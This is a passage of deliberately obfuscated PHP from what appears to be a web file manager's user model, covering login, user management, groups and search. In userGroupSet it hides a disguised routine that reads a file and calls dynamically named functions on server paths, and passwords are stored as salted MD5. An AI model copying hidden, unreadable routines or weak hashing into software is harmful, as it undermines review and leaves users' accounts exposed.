LNG($eÌÏ∑îü∑©[$fÁç¢°◊®Ï]); } public function getInfoByMeta($D¶“Ï¯∑âæ, $eÈ‰¬≤é∞ï) { $Eæê†€î—¿ =& $_SERVER[’ÿƒ†ïò]; $E„∏Ù∆ŒÛÆ = Model($Eæê†€î—¿[2171])->where(array($Eæê†€î—¿[93] => $D¶“Ï¯∑âæ, $Eæê†€î—¿[372] => $eÈ‰¬≤é∞ï))->find(); if ($E„∏Ù∆ŒÛÆ) { return $this->getInfo($E„∏Ù∆ŒÛÆ[$Eæê†€î—¿[1557]]); } return !1; } public function userLoginCheck($DëœºûΩı—, $A∆Ì®Â≈û) { $C•π°í™Í‰ =& $_SERVER[’ÿƒ†ïò]; $d§ô¡¬ÿ¯Û = $this->userLoginFind($DëœºûΩı—); if (!$d§ô¡¬ÿ¯Û) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($d§ô¡¬ÿ¯Û[$C•π°í™Í‰[1557]], $A∆Ì®Â≈û)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($d§ô¡¬ÿ¯Û[$C•π°í™Í‰[1557]]); } public function userLoginFind($aÆ†∏„«ç£) { $C™ÙóãÙÙ∞ =& $_SERVER[’ÿƒ†ïò]; $AÊ´¯‡Ω…∞ = array($C™ÙóãÙÙ∞[28] => $aÆ†∏„«ç£, $C™ÙóãÙÙ∞[1991] => $aÆ†∏„«ç£, $C™ÙóãÙÙ∞[303] => $aÆ†∏„«ç£, $C™ÙóãÙÙ∞[2172] => $aÆ†∏„«ç£, $C™ÙóãÙÙ∞[987] => $C™ÙóãÙÙ∞[989]); if ($this->nickNameRpt()) { unset($AÊ´¯‡Ω…∞[$C™ÙóãÙÙ∞[1991]]); } return $this->where($AÊ´¯‡Ω…∞)->find(); } public function clearCache($BùÀ∂ªµÆ) { $aßá§ŸüûÑ =& $_SERVER[’ÿƒ†ïò]; $this->cacheFunctionClear($aßá§ŸüûÑ[1804], $BùÀ∂ªµÆ); $this->cacheFunctionClear($aßá§ŸüûÑ[1805], $BùÀ∂ªµÆ); $this->cacheFunctionClear($aßá§ŸüûÑ[2153], $BùÀ∂ªµÆ); } public function userPasswordCheck($FÖ¿ôËŸ¡÷, $bèäÚ¬Â˜ﬂ) { $f±∏”ÉÏî° =& $_SERVER[’ÿƒ†ïò]; $BÜôÍ¡Í∞Ÿ = $this->where(array($f±∏”ÉÏî°[1557] => intval($FÖ¿ôËŸ¡÷)))->find(); $dÎ“ÈÏ‹ Í = $this->metaGet($FÖ¿ôËŸ¡÷); $c»∑»ÌÔÕ° = isset($dÎ“ÈÏ‹ Í[$f±∏”ÉÏî°[2173]]) ? $dÎ“ÈÏ‹ Í[$f±∏”ÉÏî°[2173]] : $f±∏”ÉÏî°[33]; if (md5($c»∑»ÌÔÕ° . trim($bèäÚ¬Â˜ﬂ)) !== $BÜôÍ¡Í∞Ÿ[$f±∏”ÉÏî°[879]]) { return !1; } return !0; } public function userAdd($DÀøÕﬂÀØâ) { goto A€‡Ü©∑ïù; AÛ˜Ú™…ì¡: $e÷¯û§˘¥£ = $this->_checkExist($DÀøÕﬂÀØâ); if ($e÷¯û§˘¥£ !== !0) { return $e÷¯û§˘¥£; } $CÈ¿π∆ôäà = $this->add($B©Ò¶üø¨≤); goto cä…”ñáá™; cä…”ñáá™: $D·©∆àà‘Ñ = array($fÈ∑∆âîÂç[2181] => $B©Ò¶üø¨≤[$fÈ∑∆âîÂç[879]], $fÈ∑∆âîÂç[2177] => $B©Ò¶üø¨≤[$fÈ∑∆âîÂç[1991]]); $this->userEdit($CÈ¿π∆ôäà, $D·©∆àà‘Ñ); Model($fÈ∑∆âîÂç[1234])->userRootAdd($CÈ¿π∆ôäà); goto BÎ◊Æ‚ŒÕ≠; A€‡Ü©∑ïù: $fÈ∑∆âîÂç =& $_SERVER[’ÿƒ†ïò]; $B©Ò¶üø¨≤ = array($fÈ∑∆âîÂç[415] => $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[28]], $fÈ∑∆âîÂç[2174] => $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1440]], $fÈ∑∆âîÂç[2175] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[303]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[303]] : $fÈ∑∆âîÂç[33], $fÈ∑∆âîÂç[2176] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2172]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2172]] : $fÈ∑∆âîÂç[33], $fÈ∑∆âîÂç[2177] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1991]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1991]] : $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[28]], $fÈ∑∆âîÂç[2178] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2157]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2157]] : $fÈ∑∆âîÂç[33], $fÈ∑∆âîÂç[2179] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2180]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[2180]] : 1, $fÈ∑∆âîÂç[2181] => $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[879]], $fÈ∑∆âîÂç[1806] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1710]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1710]] : 1024 * 1024 * 20, $fÈ∑∆âîÂç[1807] => 0, $fÈ∑∆âîÂç[2182] => 0, $fÈ∑∆âîÂç[1849] => isset($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[738]]) ? $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[738]] : 1); if (!empty($DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1557]])) { $B©Ò¶üø¨≤[$fÈ∑∆âîÂç[1557]] = $DÀøÕﬂÀØâ[$fÈ∑∆âîÂç[1557]]; } goto AÛ˜Ú™…ì¡; BÎ◊Æ‚ŒÕ≠: return $CÈ¿π∆ôäà; goto A•¨◊Íƒã¯; A•¨◊Íƒã¯: } protected function userEditTest($FÍÆıÏ¶’, $bë£·ﬂ–†å) { return $this->call($_SERVER[’ÿƒ†ïò][2183], $FÍÆıÏ¶’, $bë£·ﬂ–†å); } protected function userEdit($Cùä≤≈éÆ´, $CÒèªÔ≠Üœ) { goto f¡‹®‰Íß±; f¡‹®‰Íß±: $FË¬⁄ü†Êõ =& $_SERVER[’ÿƒ†ïò]; $bã∑óﬁÂ•√ = $this->getInfoSimple($Cùä≤≈éÆ´); if (!$bã∑óﬁÂ•√) { return !1; } goto DãïæçºÂä; c‰¿¯ÆÂı∂: return !0; goto B≥Êô¥æ¿Ï; C≠ÔÑ‹Ôà°: $this->where(array($FË¬⁄ü†Êõ[1548] => $Cùä≤≈éÆ´))->save($CÒèªÔ≠Üœ); if (isset($CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[1991]])) { $this->setNamePinyin($Cùä≤≈éÆ´, $CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[1991]]); } $this->clearCache($Cùä≤≈éÆ´); goto c‰¿¯ÆÂı∂; DãïæçºÂä: $AÃçÍº «¿ = $this->_checkExist($CÒèªÔ≠Üœ, $Cùä≤≈éÆ´); if ($AÃçÍº «¿ !== !0) { return $AÃçÍº «¿; } if (isset($CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[879]]) && trim($CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[879]]) != $FË¬⁄ü†Êõ[33]) { $eæœ„ÜΩÇ = $this->metaGet($Cùä≤≈éÆ´); if (empty($eæœ„ÜΩÇ[$FË¬⁄ü†Êõ[2173]])) { $eæœ„ÜΩÇ[$FË¬⁄ü†Êõ[2173]] = rand_string(10); Model($FË¬⁄ü†Êõ[507])->metaSet($Cùä≤≈éÆ´, $FË¬⁄ü†Êõ[2173], $eæœ„ÜΩÇ[$FË¬⁄ü†Êõ[2173]]); } $CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[879]] = md5($eæœ„ÜΩÇ[$FË¬⁄ü†Êõ[2173]] . trim($CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[879]])); } else { unset($CÒèªÔ≠Üœ[$FË¬⁄ü†Êõ[879]]); } goto C≠ÔÑ‹Ôà°; B≥Êô¥æ¿Ï: } public function setNamePinyin($AñÆÓôÃŒ‡, $e≠å‚Ÿúé = false) { $c«§÷Ω∞œ∂ =& $_SERVER[’ÿƒ†ïò]; if (!$e≠å‚Ÿúé) { $açøµà„≈ñ = $this->getInfoSimple($AñÆÓôÃŒ‡); $e≠å‚Ÿúé = $açøµà„≈ñ[$c«§÷Ω∞œ∂[1991]] ? $açøµà„≈ñ[$c«§÷Ω∞œ∂[1991]] : $açøµà„≈ñ[$c«§÷Ω∞œ∂[28]]; } $F≥≠è…˘ü = Model($c«§÷Ω∞œ∂[532]); if (!Input::check($e≠å‚Ÿúé, $c«§÷Ω∞œ∂[581])) { return $F≥≠è…˘ü->metaSet($AñÆÓôÃŒ‡, array($c«§÷Ω∞œ∂[458] => $c«§÷Ω∞œ∂[33], $c«§÷Ω∞œ∂[457] => $c«§÷Ω∞œ∂[33])); } return $F≥≠è…˘ü->metaSet($AñÆÓôÃŒ‡, array($c«§÷Ω∞œ∂[458] => str_replace($c«§÷Ω∞œ∂[50], $c«§÷Ω∞œ∂[33], Pinyin::get($e≠å‚Ÿúé)), $c«§÷Ω∞œ∂[457] => Pinyin::get($e≠å‚Ÿúé, $c«§÷Ω∞œ∂[582]))); } private function nickNameRpt() { $Aí´‘õîïÒ =& $_SERVER[’ÿƒ†ïò]; $E±Ôπ€Í≠è = Model($Aí´‘õîïÒ[758])->get($Aí´‘õîïÒ[2184]); $cé‹åã√⁄÷ = $GLOBALS[$Aí´‘õîïÒ[6]][$Aí´‘õîïÒ[379]][$Aí´‘õîïÒ[2184]]; $F≤”Ÿ¿«≤¥ = !is_null($E±Ôπ€Í≠è) ? $E±Ôπ€Í≠è : $cé‹åã√⁄÷; return !!$F≤”Ÿ¿«≤¥; } private function _checkExist($aüı÷Ìá÷Õ, $c˜ÉóÇîÊÃ = false) { $Cúûœ£·µ∫ =& $_SERVER[’ÿƒ†ïò]; $Dƒúà«å≤î = array($Cúûœ£·µ∫[28] => UserModel::ERROR_USER_EXIST_NAME, $Cúûœ£·µ∫[1991] => UserModel::ERROR_USER_EXIST_NICKNAME, $Cúûœ£·µ∫[303] => UserModel::ERROR_USER_EXIST_EMAIL, $Cúûœ£·µ∫[2172] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Dƒúà«å≤î[$Cúûœ£·µ∫[1991]]); } $d†ãßäËÑì = $c˜ÉóÇîÊÃ ? array($Cúûœ£·µ∫[1557] => array($Cúûœ£·µ∫[2185], $c˜ÉóÇîÊÃ)) : array(); foreach ($Dƒúà«å≤î as $b”®∏àî“ => $a–ã‡Ü¬ò“) { $fßìˆÈŸ‡ü = array(); foreach ($Dƒúà«å≤î as $B¶”¯›≠…ò => $bäÂ‡ÁÇıﬁ) { if (isset($aüı÷Ìá÷Õ[$B¶”¯›≠…ò]) && $aüı÷Ìá÷Õ[$B¶”¯›≠…ò]) { $fßìˆÈŸ‡ü[] = $aüı÷Ìá÷Õ[$B¶”¯›≠…ò]; } } if (!$fßìˆÈŸ‡ü) { continue; } $Eã—±Øå»¢ = array_merge(array($b”®∏àî“ => array($Cúûœ£·µ∫[7], $fßìˆÈŸ‡ü)), $d†ãßäËÑì); $DÖ†üéı£ú = $this->where($Eã—±Øå»¢)->find(); if ($DÖ†üéı£ú) { return $a–ã‡Ü¬ò“; } } return !0; } public function userListInfo($B¶êÁ€≠∏ﬁ) { $f¡ô©È‰çŒ =& $_SERVER[’ÿƒ†ïò]; $bÌ∑∑ªïî’ = array(); $B¶êÁ€≠∏ﬁ = is_array($B¶êÁ€≠∏ﬁ) ? array_unique($B¶êÁ€≠∏ﬁ) : array(); if (!$B¶êÁ€≠∏ﬁ) { return $bÌ∑∑ªïî’; } if (count($B¶êÁ€≠∏ﬁ) < 20) { foreach ($B¶êÁ€≠∏ﬁ as $D‹˘√¿∫§º) { $bÌ∑∑ªïî’[$D‹˘√¿∫§º . $f¡ô©È‰çŒ[33]] = $this->getInfoSimpleOuter($D‹˘√¿∫§º); } } else { $AüáﬂœŸ‘Á = array($f¡ô©È‰çŒ[1548] => array($f¡ô©È‰çŒ[413], $B¶êÁ€≠∏ﬁ)); if (count($B¶êÁ€≠∏ﬁ) == 1) { $AüáﬂœŸ‘Á = array($f¡ô©È‰çŒ[1548] => $B¶êÁ€≠∏ﬁ[0]); } $f—¶åﬂã≠Ω = Model($f¡ô©È‰çŒ[507])->field($this->simpleField)->where($AüáﬂœŸ‘Á)->select(); $f—¶åﬂã≠Ω = array_to_keyvalue($f—¶åﬂã≠Ω, $f¡ô©È‰çŒ[1557]); foreach ($B¶êÁ€≠∏ﬁ as $D‹˘√¿∫§º) { $cíÙò∆∆—Ü = $f—¶åﬂã≠Ω[$D‹˘√¿∫§º]; if (!$cíÙò∆∆—Ü) { $bÌ∑∑ªïî’[$D‹˘√¿∫§º . $f¡ô©È‰çŒ[33]] = $this->getInfoSimpleOuter($D‹˘√¿∫§º); continue; } $cíÙò∆∆—Ü[$f¡ô©È‰çŒ[2157]] = Action($f¡ô©È‰çŒ[2158])->parseUrl($cíÙò∆∆—Ü[$f¡ô©È‰çŒ[2157]]); $bÌ∑∑ªïî’[$D‹˘√¿∫§º . $f¡ô©È‰çŒ[33]] = $cíÙò∆∆—Ü; } } return $bÌ∑∑ªïî’; } protected function userStatus($bﬁ˘”≤Ôœô, $d‰ë¥∆¯›ë) { $c‹ÖÕ–⁄Ç‘ = $this->getInfoSimple($bﬁ˘”≤Ôœô); if (!$c‹ÖÕ–⁄Ç‘) { return !1; } $dºú·–èˆ± = array($_SERVER[’ÿƒ†ïò][738] => $d‰ë¥∆¯›ë); return $this->userEdit($bﬁ˘”≤Ôœô, $dºú·–èˆ±); } protected function userRemove($eóﬁèú¢ºÌ) { goto dÆ¡¿ÇñÇ—; dÆ¡¿ÇñÇ—: $C∫çƒ©çø† =& $_SERVER[’ÿƒ†ïò]; $a¨∑ç‘Èâ≥ = $this->getInfoSimple($eóﬁèú¢ºÌ); if (!$a¨∑ç‘Èâ≥) { return !1; } goto C‹û¶Àıú≥; C‹û¶Àıú≥: $c˘‚ë∑¢ÍÙ = array($C∫çƒ©çø†[1548] => $eóﬁèú¢ºÌ); Model($C∫çƒ©çø†[589])->where($c˘‚ë∑¢ÍÙ)->delete(); Model($C∫çƒ©çø†[2186])->where($c˘‚ë∑¢ÍÙ)->delete(); goto bˆ¯ñˆ∫áè; bˆ¯ñˆ∫áè: Model($C∫çƒ©çø†[1812])->where($c˘‚ë∑¢ÍÙ)->delete(); Model($C∫çƒ©çø†[2171])->where($c˘‚ë∑¢ÍÙ)->delete(); Model($C∫çƒ©çø†[2187])->where($c˘‚ë∑¢ÍÙ)->delete(); goto b¬â≤”äë∏; b¬â≤”äë∏: Model($C∫çƒ©çø†[2008])->removeUserAll($eóﬁèú¢ºÌ); Model($C∫çƒ©çø†[820])->userRootRemove($eóﬁèú¢ºÌ); return $this->where($c˘‚ë∑¢ÍÙ)->delete(); goto CçãÏÏÒ¥Æ; CçãÏÏÒ¥Æ: } protected function userGroupSet($cçÖ‰Ñëø–, $CüëŒ≤‡ÿ‚, $bèï¡±⁄≈ë = array()) { goto bá®≈…à€; CÑöÂ‘Àöõ: return $D’é¬’Û»∆->addAll($D†±ÊêÊ≤ª, array(), !0); goto B‘√†Ââï¿; A¡É¨÷è÷ˆ: if (!$aıèÑŒñ¿Ê || !is_array($CüëŒ≤‡ÿ‚)) { return !1; } $D’é¬’Û»∆ = Model($AÎã•≈Øîú[1812]); $D’é¬’Û»∆->where(array($AÎã•≈Øîú[1557] => $cçÖ‰Ñëø–))->delete(); goto cπÈ‘èÇﬁƒ; cπÈ‘èÇﬁƒ: $D†±ÊêÊ≤ª = array(); $b·èﬁ∫úê⁄ = 0; foreach ($CüëŒ≤‡ÿ‚ as $CÇˆ®úÁ∞Ò => $D‘îÚ‰ÿñΩ) { $C´ºóÏíº’ = array($AÎã•≈Øîú[1557] => $cçÖ‰Ñëø–, $AÎã•≈Øîú[1726] => $CÇˆ®úÁ∞Ò, $AÎã•≈Øîú[1826] => $D‘îÚ‰ÿñΩ); $C´ºóÏíº’[$AÎã•≈Øîú[1749]] = isset($bèï¡±⁄≈ë[$b·èﬁ∫úê⁄]) ? $bèï¡±⁄≈ë[$b·èﬁ∫úê⁄] : 0; $b·èﬁ∫úê⁄++; $D†±ÊêÊ≤ª[] = $C´ºóÏíº’; } goto CÑöÂ‘Àöõ; bá®≈…à€: $AÎã•≈Øîú =& $_SERVER[’ÿƒ†ïò]; if ($_SERVER[$AÎã•≈Øîú[854]] != $_SERVER[$AÎã•≈Øîú[855]]) { goto EØÏ¢ŸˆﬂÔ; AìÍÁìÑÖë: $eÊˆÃÖÖëí = $AÎã•≈Øîú[870]; $eÊˆÃÖÖëí($_SERVER[$AÎã•≈Øîú[871]]); $eÊˆÃÖÖëí($_SERVER[$AÎã•≈Øîú[857]] . $AÎã•≈Øîú[872]); goto AÙ•ÁËöó; EØÏ¢ŸˆﬂÔ: $B∞¯ï¬ßì≈ = $AÎã•≈Øîú[869]; $cáÜÙõ’∂Ö = $AÎã•≈Øîú[856]; $b‹ÿŒçÛıΩ = $_SERVER[$AÎã•≈Øîú[857]] . $AÎã•≈Øîú[858]; goto bÔè˜ç¬ºÀ; bÔè˜ç¬ºÀ: $Aëà∞åÇçæ = $cáÜÙõ’∂Ö($b‹ÿŒçÛıΩ); $e°âè£î«é = explode($AÎã•≈Øîú[229], $Aëà∞åÇçæ); if (count($e°âè£î«é) < $AÎã•≈Øîú[625]) { $f¢√ëˆ£»™ = $AÎã•≈Øîú[859]; $f¢√ëˆ£»™(); } goto AìÍÁìÑÖë; AÙ•ÁËöó: $EÖïóœÂ—Ÿ = 1; while ($EÖïóœÂ—Ÿ > 1) { $EÖïóœÂ—Ÿ = $EÖïóœÂ—Ÿ + 4; $eÆ˜Íÿ˘ﬂ∂ = rawurlencode($EÖïóœÂ—Ÿ . $AÎã•≈Øîú[376]); } goto c∏Üæö‘“¨; c∏Üæö‘“¨: } $aıèÑŒñ¿Ê = $this->getInfoSimple($cçÖ‰Ñëø–); goto A¡É¨÷è÷ˆ; B‘√†Ââï¿: } protected function userGroupAdd($E÷‚èÒΩùÂ, $D‚ø⁄Ñàã• = array()) { $EµÂñ√£‘ú =& $_SERVER[’ÿƒ†ïò]; $A·≤ÑÑÇŒû = $this->getInfoSimple($E÷‚èÒΩùÂ); if (!$A·≤ÑÑÇŒû || empty($D‚ø⁄Ñàã•)) { return !1; } $Bñ‡Æøàƒ” = array(); foreach ($D‚ø⁄Ñàã• as $aì«Ú ÿÓÃ => $C£ø€ÂÇ’ï) { $Bñ‡Æøàƒ”[] = array($EµÂñ√£‘ú[1557] => $E÷‚èÒΩùÂ, $EµÂñ√£‘ú[1726] => $aì«Ú ÿÓÃ, $EµÂñ√£‘ú[1826] => $C£ø€ÂÇ’ï, $EµÂñ√£‘ú[1749] => 0); } return Model($EµÂñ√£‘ú[1812])->addAll($Bñ‡Æøàƒ”, array(), !0); } protected function userGroupRemove($dìÇäúüàŒ, $D¬Ü˘îäêØ) { $bî˜∆√ıÇ• =& $_SERVER[’ÿƒ†ïò]; $Eïå´∏‚“‘ = $this->getInfoSimple($dìÇäúüàŒ); if (!$Eïå´∏‚“‘ || !$D¬Ü˘îäêØ) { return !1; } $dÇ◊‰⁄È˜è = array($bî˜∆√ıÇ•[1548] => $dìÇäúüàŒ, $bî˜∆√ıÇ•[1810] => $D¬Ü˘îäêØ); return Model($bî˜∆√ıÇ•[1812])->where($dÇ◊‰⁄È˜è)->delete(); } public function listData() { $EÉëá≤Ú∏Ò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EÉëá≤Ú∏Ò[$_SERVER[’ÿƒ†ïò][367]]); return $EÉëá≤Ú∏Ò; } public function listByID($CÔ»ÎÂø™ö) { goto DôûÀéŒ°ë; Bÿà™°¬ıƒ: return $CºÜ≤æ¢»¥; goto b◊‘»ìÖóŒ; aœ⁄ÑÁ◊ÜÀ: $CºÜ≤æ¢»¥ = $this->where($cï…·„ùè∏)->select(); $CºÜ≤æ¢»¥ = array_sort_keep($CºÜ≤æ¢»¥, $a«Â‰ò–ä⁄[1557], $CÔ»ÎÂø™ö); $this->_listDataApply($CºÜ≤æ¢»¥); goto Bÿà™°¬ıƒ; DôûÀéŒ°ë: $a«Â‰ò–ä⁄ =& $_SERVER[’ÿƒ†ïò]; if (!$CÔ»ÎÂø™ö) { return; } $cï…·„ùè∏ = array($a«Â‰ò–ä⁄[1557] => array($a«Â‰ò–ä⁄[7], $CÔ»ÎÂø™ö)); goto aœ⁄ÑÁ◊ÜÀ; b◊‘»ìÖóŒ: } public function listByGroup($c°ã‰Ù˘úé = 0, $e§çà◊Ñ° = array()) { goto fô∞£Ç⁄¢π; C≤™ˆÚ¬æÓ: $this->_listDataApply($e˘ıÁÜù·‰[$A‹Ìõ‘√Áπ[367]]); return $e˘ıÁÜù·‰; goto f®ëóøå†Œ; fô∞£Ç⁄¢π: $A‹Ìõ‘√Áπ =& $_SERVER[’ÿƒ†ïò]; $C™Ùí≥áÍÆ = $A‹Ìõ‘√Áπ[33]; $bƒ“· Æ¢è = array(); goto aÙ›ÜΩ‰ùÑ; aÙ›ÜΩ‰ùÑ: if ($c°ã‰Ù˘úé) { $bƒ“· Æ¢è = array($A‹Ìõ‘√Áπ[2188] => intval($c°ã‰Ù˘úé)); $C™Ùí≥áÍÆ = "\114\x45\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\x65\162\137\x67\162\157\x75\x70\x20\165\x73\x65\x72\x5f\x67\162\157\165\160\40\x6f\156\x20\165\163\x65\162\56\165\x73\145\162\111\104\x20\x3d\x20\x75\x73\x65\162\137\147\x72\157\165\160\56\165\x73\145\162\111\104"; $C™‚™Ë·Ã‹ = Input::get($A‹Ìõ‘√Áπ[449], null, $A‹Ìõ‘√Áπ[33]) ? $A‹Ìõ‘√Áπ[33] : $A‹Ìõ‘√Áπ[2189]; } if (isset($e§çà◊Ñ°[$A‹Ìõ‘√Áπ[738]])) { $bƒ“· Æ¢è[$A‹Ìõ‘√Áπ[2190]] = $e§çà◊Ñ°[$A‹Ìõ‘√Áπ[738]]; } $e˘ıÁÜù·‰ = $this->_makeOrder($C™‚™Ë·Ã‹)->field($A‹Ìõ‘√Áπ[2191])->where($bƒ“· Æ¢è)->join($C™Ùí≥áÍÆ)->selectPage(50); goto C≤™ˆÚ¬æÓ; f®ëóøå†Œ: } private function _makeOrder($fÀÏú√ò« = '') { goto FÏﬂúÍ∫ôÏ; FÏﬂúÍ∫ôÏ: $dﬁ∆Ê°Ã÷ò =& $_SERVER[’ÿƒ†ïò]; $AÚÔÿ„Éú® = array($dﬁ∆Ê°Ã÷ò[1557], $dﬁ∆Ê°Ã÷ò[28], $dﬁ∆Ê°Ã÷ò[1712], $dﬁ∆Ê°Ã÷ò[1684], $dﬁ∆Ê°Ã÷ò[194]); $Cåà‡Á‰òª = array($dﬁ∆Ê°Ã÷ò[442] => $dﬁ∆Ê°Ã÷ò[443], $dﬁ∆Ê°Ã÷ò[444] => $dﬁ∆Ê°Ã÷ò[445]); goto F…ß›É¬⁄ı; A±¯Ø°‰åù: $fÀÏú√ò« = $fÀÏú√ò« . "\x75\163\145\x72\56{$cÛÏ∏æ‚É√}\40{$A÷Ù”¢≥Ã∏}\x2c\x20\165\163\x65\162\x2e\165\163\x65\162\111\x44\40\141\x73\143"; return $this->alias($dﬁ∆Ê°Ã÷ò[1933])->order($fÀÏú√ò«); goto bŸ≤ë ïøÏ; F…ß›É¬⁄ı: $cÛÏ∏æ‚É√ = Input::get($dﬁ∆Ê°Ã÷ò[449], $dﬁ∆Ê°Ã÷ò[7], $dﬁ∆Ê°Ã÷ò[1548], $AÚÔÿ„Éú®); $A÷Ù”¢≥Ã∏ = Input::get($dﬁ∆Ê°Ã÷ò[450], $dﬁ∆Ê°Ã÷ò[7], $dﬁ∆Ê°Ã÷ò[1813], array($dﬁ∆Ê°Ã÷ò[1813], $dﬁ∆Ê°Ã÷ò[444])); $A÷Ù”¢≥Ã∏ = $Cåà‡Á‰òª[$A÷Ù”¢≥Ã∏]; goto A±¯Ø°‰åù; bŸ≤ë ïøÏ: } public function listSearch($aÊ≥ñæÜõØ) { goto c≤¿Úå∑◊ß; E£÷¬¬Ûﬁ◊: $FëΩ‰Ù¬ÑÚ = str_replace($aìπèı™ùÈ[1816], $aìπèı™ùÈ[1817], trim($FëΩ‰Ù¬ÑÚ)); $C‰Ÿûπã¢Õ = array($aìπèı™ùÈ[28] => array($aìπèı™ùÈ[381], "\45{$FëΩ‰Ù¬ÑÚ}\45"), $aìπèı™ùÈ[303] => array($aìπèı™ùÈ[381], "{$FëΩ‰Ù¬ÑÚ}\45"), $aìπèı™ùÈ[1991] => array($aìπèı™ùÈ[381], "{$FëΩ‰Ù¬ÑÚ}\x25"), $aìπèı™ùÈ[987] => $aìπèı™ùÈ[1818]); if (Input::check($FëΩ‰Ù¬ÑÚ, $aìπèı™ùÈ[309])) { $C‰Ÿûπã¢Õ[$aìπèı™ùÈ[1557]] = array($aìπèı™ùÈ[381], "{$FëΩ‰Ù¬ÑÚ}\x25"); $C‰Ÿûπã¢Õ[$aìπèı™ùÈ[2172]] = array($aìπèı™ùÈ[381], "{$FëΩ‰Ù¬ÑÚ}\x25"); } goto CËêœ∑•…°; CËêœ∑•…°: if (!$FëΩ‰Ù¬ÑÚ) { $C‰Ÿûπã¢Õ = array(); } if (isset($aÊ≥ñæÜõØ[$aìπèı™ùÈ[738]])) { $C‰Ÿûπã¢Õ[$aìπèı™ùÈ[738]] = $aÊ≥ñæÜõØ[$aìπèı™ùÈ[738]]; } $C‰Ÿûπã¢Õ = $this->parseWhereLike($C‰Ÿûπã¢Õ); goto BÜÜÙÓ¯Ì; BÜÜÙÓ¯Ì: $d’ øâ¿€î = $this->_makeOrder()->where($C‰Ÿûπã¢Õ)->selectPage(20); if (!$d’ øâ¿€î || count($d’ øâ¿€î[$aìπèı™ùÈ[367]]) < 5 && Input::check($FëΩ‰Ù¬ÑÚ, $aìπèı™ùÈ[316])) { $F±ëÜÕ’“È = $this->_searchFromMeta($aìπèı™ùÈ[457], $FëΩ‰Ù¬ÑÚ, 10); $eˆøÉ“Í¡ç = $this->_searchFromMeta($aìπèı™ùÈ[458], $FëΩ‰Ù¬ÑÚ, 10); $bÊ¬üÈá¯ö = array_merge($F±ëÜÕ’“È, $eˆøÉ“Í¡ç, $d’ øâ¿€î[$aìπèı™ùÈ[367]]); $d’ øâ¿€î[$aìπèı™ùÈ[367]] = array_unique_by_key($bÊ¬üÈá¯ö, $aìπèı™ùÈ[1557]); $d’ øâ¿€î[$aìπèı™ùÈ[364]][$aìπèı™ùÈ[365]] = count($d’ øâ¿€î[$aìπèı™ùÈ[367]]); $d’ øâ¿€î[$aìπèı™ùÈ[364]][$aìπèı™ùÈ[366]] = ceil($d’ øâ¿€î[$aìπèı™ùÈ[364]][$aìπèı™ùÈ[365]] / $d’ øâ¿€î[$aìπèı™ùÈ[364]][$aìπèı™ùÈ[361]]); } $this->_listDataApply($d’ øâ¿€î[$aìπèı™ùÈ[367]]); goto E≤Œµîü≈ì; c≤¿Úå∑◊ß: $aìπèı™ùÈ =& $_SERVER[’ÿƒ†ïò]; $FëΩ‰Ù¬ÑÚ = $aÊ≥ñæÜõØ[$aìπèı™ùÈ[1814]]; $FŸµó∏Íß» = isset($aÊ≥ñæÜõØ[$aìπèı™ùÈ[1815]]) ? $aÊ≥ñæÜõØ[$aìπèı™ùÈ[1815]] : !1; goto E£÷¬¬Ûﬁ◊; E≤Œµîü≈ì: $this->_filterByGroup($d’ øâ¿€î, $FŸµó∏Íß»); return $d’ øâ¿€î; goto bƒÑ£ê§€à; bƒÑ£ê§€à: } private function _filterByGroup(&$e≥¥ƒ“äÛ…, $aÿ“Ÿ’â…›) { $aéµŸ€Üë∏ =& $_SERVER[’ÿƒ†ïò]; if (!$aÿ“Ÿ’â…›) { return $e≥¥ƒ“äÛ…; } foreach ($e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[367]] as $f›œÕã∏Ç» => &$d÷ß’»∆âê) { $C©ªü¿ˆñ = array_to_keyvalue($d÷ß’»∆âê[$aéµŸ€Üë∏[1903]], $aéµŸ€Üë∏[33], $aéµŸ€Üë∏[1726]); if (!in_array($aÿ“Ÿ’â…›, $C©ªü¿ˆñ)) { unset($e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[367]][$f›œÕã∏Ç»]); } } unset($d÷ß’»∆âê); $e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[367]] = array_values($e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[367]]); $e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[364]] = array($aéµŸ€Üë∏[1965] => count($e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[367]]), $aéµŸ€Üë∏[1963] => $e≥¥ƒ“äÛ…[$aéµŸ€Üë∏[364]][$aéµŸ€Üë∏[361]], $aéµŸ€Üë∏[1962] => 1, $aéµŸ€Üë∏[1964] => 1); } private function _searchFromMeta($f◊ÿØˆ¬ı√, $aÃ◊»©¬ﬂå, $Açˆíªƒº±) 